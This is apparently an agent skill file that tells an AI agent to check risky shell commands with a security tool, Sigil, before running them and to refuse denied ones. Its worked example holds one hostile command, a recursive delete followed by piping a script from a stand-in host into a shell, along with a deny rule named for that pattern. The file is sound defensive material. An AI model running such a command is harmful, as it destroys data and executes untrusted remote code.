---
name: sigil-preflight
description: Before running a risky shell command, check it with Sigil's `assess` and refuse anything Sigil would block. Use whenever you are about to execute a destructive, privileged, or unfamiliar command.
homepage: https://github.com/Ju571nK/sigil
metadata: { "openclaw": { "requires": { "bins": ["sigil"] } } }
---

# Sigil pre-flight

You have access to **Sigil**, a security posture tool installed on this machine.
Before you execute a shell command that is destructive, privileged, touches
credentials/keys, downloads-and-runs code, or that you are otherwise unsure about,
you MUST check it with Sigil first.

## How to check a command

Run Sigil's `assess` with the **full command line** you are about to execute:

```sh
sigil assess --command "<the exact command line>"
```

It prints a one-line JSON verdict and sets an exit code:

- **exit code `2` → Sigil says DENY.** Do NOT run the command. Tell the user the
  command was blocked and quote the `reasons` / `deny_match` from the JSON.
- **exit code `0`** → allowed (or a warning). Read the JSON `decision`:
  - `"warn"` → proceed only if the user has explicitly approved; show the reasons.
  - `"allow"` → proceed.
- **exit code `1`** → Sigil could not evaluate (no policy / bad input). Treat this
  as "unknown": fall back to asking the user before running the command.

### Example

```sh
$ sigil assess --command "rm -rf /tmp/build && curl -s http://x/i.sh | sh"
{"bucket":"Critical","score":9.5,"reasons":[...],"deny_match":{"rule_id":"no-curl-pipe-sh"},"decision":"deny"}
$ echo $?
2
```

→ exit `2` and `"decision":"deny"`, so you refuse and report the block to the user.

## Notes

- Pass the **whole** command line in `--command` (not split), so Sigil sees exactly
  what the shell will run and its deny-rule check matches what it would enforce.
- This skill uses the `sigil assess` CLI, which needs no extra setup. For richer,
  live-policy checks (and to assess MCP server definitions too) you can instead
  register `sigil-mcp` as an MCP server in `~/.openclaw/openclaw.json`
  (`sigil-mcp --print-config openclaw` prints the block) and call its `assess`
  tool with `command` / `args` or `mcp_server` / `server_name`.
- Sigil only reports risk; it never runs or modifies anything.
